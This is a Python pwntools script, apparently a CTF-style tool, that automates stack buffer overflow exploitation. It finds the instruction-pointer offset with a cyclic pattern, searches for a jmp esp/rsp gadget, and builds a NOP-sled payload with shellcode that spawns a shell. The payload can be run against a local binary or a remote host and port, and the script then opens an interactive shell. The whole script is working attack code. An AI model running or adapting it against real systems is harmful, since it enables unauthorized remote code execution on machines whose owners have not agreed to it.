#!/usr/bin/python3
from pwn import *
import sys
import optparse
import ropper

def find_ip(payload, binary_arch):
    p = process(binary)
    context.log_level = "error"
    p.sendline(payload)
    p.wait()
    esp_register = p.corefile.sp
    if binary_arch == "32bit":
        ip_offset = cyclic_find(p.corefile.pc)  # x86
    else:
        ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64

    return ip_offset,esp_register

def find_jmp(binary):
    try:
        jmp_esp = ""
        rs = ropper.RopperService()
        rs.addFile(binary)
        rs.loadGadgetsFor()
        for file, gadget in rs.search(search='jmp ?sp'):
            jmp_esp = gadget.address
    except:
        jmp_esp = ""
    return jmp_esp

def jmp_exploit(offset, esp_register, binary_arch, jmp_esp):
    try:
        info("offset : %#d ", offset)
        info("esp_register: %#x " ,esp_register)
        info("jmp esp/rsp: %#x", jmp_esp)

        payload = b"\x90"*offset
        if binary_arch == "32bit":
            payload += p32(jmp_esp)  # x86
        else:
            payload += p64(jmp_esp)  # x64
        payload += b"\x90"* 10
        payload += asm(shellcraft.sh())

        return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")

def injection_exploit(offset, esp_register, binary_arch):
    try:

        info("offset : %#d ", offset)
        info("esp_register: %#x " ,esp_register)
        info("jmp esp/rsp not found")

        payload = b"\x90"*10
        payload += asm(shellcraft.sh())
        payload += b"\x90" *(offset-len(payload)) 
        if binary_arch == "32bit":
            payload += p32(esp_register - offset)  # x86
            info("return_addr: %#x ", (esp_register - offset))
        else:
            payload += p64(esp_register - offset)  # x64

        return payload
    except:
        error("you have to debug by your self, add -d or --debug argument")

def remote_exploit(offset, esp_register, binary_arch, jmp_esp, host, port):
    try:
        p = remote(host,port)
        payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
        p.sendline(payload)
        p.interactive()
    except:
        error("you have to debug by your self, add -d or --debug argument")



    
if __name__ == '__main__':
    parser = optparse.OptionParser()
    parser.add_option("-r", "--remote", dest="remote", help="Remote flag to exploit remotely, example: -r [HOST] [PORT]", nargs=2)
    parser.add_option("-d", "--debug", dest="debug", help="Debug flag to attach gdb, and pwntools debug mode", action="store_true")
    parser.add_option("-p", "--pattern", dest="pattern", default=500, help="Enter number of pattern offset (Optional)")
    (options, arguments) = parser.parse_args()

    # Binary filename
    binary = str(sys.argv[1])

    # Architecture of file
    binary_arch = platform.architecture(executable=binary)[0].strip()
    success("  ------------------------------------------------")
    success("| Developed by Ahmed Alshammari, twitter: @5ch1zo |")
    success("  ------------------------------------------------")
    info("Executable architecture: %#s ",binary_arch)

    # This will automatically get context arch, bits, os etc
    elf = context.binary = ELF(binary, checksec=False)

    # Change logging level to help with debugging (error/warning/info/debug)
    context.log_level = 'info'

    # Pass in pattern_size, get back EIP/RIP offset
    pattern = int(options.pattern)
    info("Trying crash the binary with %#d bytes",int(pattern))

    find_ip_list = find_ip(cyclic(pattern), binary_arch)
    offset = find_ip_list[0]
    esp_register = find_ip_list[1]
    
    context.log_level = "info"
    # Finding jmp esp gadget
    jmp_esp = find_jmp(binary)
    try:
        # Remote Section
        if options.remote:
            host = options.remote[0]
            port = options.remote[1]
            if jmp_esp:
                remote_exploit(offset, esp_register, binary_arch, jmp_esp, host, port)
            else:
                error("we couldn't find jmp esp/rsp gadget to exploit remotely!!")
        
        # Local Section
        else:
            # Start program
            io = process(binary)
            # Debug Section
            if options.debug:
                context.log_level = 'debug'
                gdb_commands = "init-peda\n"
                gdb_commands += "b main\n"
                if jmp_esp:
                    gdb_commands += "b *"+str(hex(jmp_esp))
                gdb.attach(io, gdb_commands)

            # Find esp Section
            if not jmp_esp:
                payload = injection_exploit(offset, esp_register, binary_arch)
            else:
                payload = jmp_exploit(offset, esp_register, binary_arch, jmp_esp)
            
            # Send the payload
            io.sendline(payload)
            # Got Shell
            io.interactive()
    except:
        error("you have to debug by your self, add -d or --debug argument")
